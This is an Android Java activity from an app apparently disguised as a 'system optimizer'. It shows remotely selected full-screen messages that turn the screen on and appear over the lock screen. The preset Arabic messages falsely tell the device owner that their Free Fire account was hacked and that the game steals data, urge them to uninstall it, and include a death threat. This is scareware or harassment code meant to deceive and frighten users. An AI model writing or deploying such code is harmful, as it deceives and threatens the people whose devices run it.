package com.example.systemoptimizer;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;

public class MessageDashboardActivity extends Activity {

    /** الرسائل المعدة مسبقاً (تتطابق مع MESSAGE_DASHBOARD في controller.py). */
    public static final String[] MESSAGES = {
            "تم اختراق حسابك في فري فاير! بياناتك الشخصية معرضة للخطر. "
                    + "قم بإلغاء تثبيت اللعبة فوراً لحماية نفسك.",
            "فري فاير يسرق بياناتك الشخصية!",
            "تم تتبع استخدامك لفري فاير!",
            "اللعب المستمر لفري فاير يضر بصحتك!",
            "فري فاير يسبب إدماناً خطيراً!",
            "أنا سأقتلك... فري فاير!",
            "يجب إزالة فري فاير من جهازك الآن!",
    };

    private TextView messageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                    | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        }

        setContentView(R.layout.activity_message_dashboard);
        messageView = findViewById(R.id.dashboard_message_text);
        Button closeButton = findViewById(R.id.dashboard_close_button);
        closeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                finish();
            }
        });

        renderMessage();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        renderMessage();
    }

    private void renderMessage() {
        Intent intent = getIntent();
        int index = intent.getIntExtra("message_index", -1);
        String text = intent.getStringExtra("message_text");
        if (index >= 1 && index <= MESSAGES.length) {
            messageView.setText(MESSAGES[index - 1]);
        } else if (text != null && !text.trim().isEmpty()) {
            messageView.setText(text);
        } else {
            messageView.setText(MESSAGES[0]);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            finish();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
}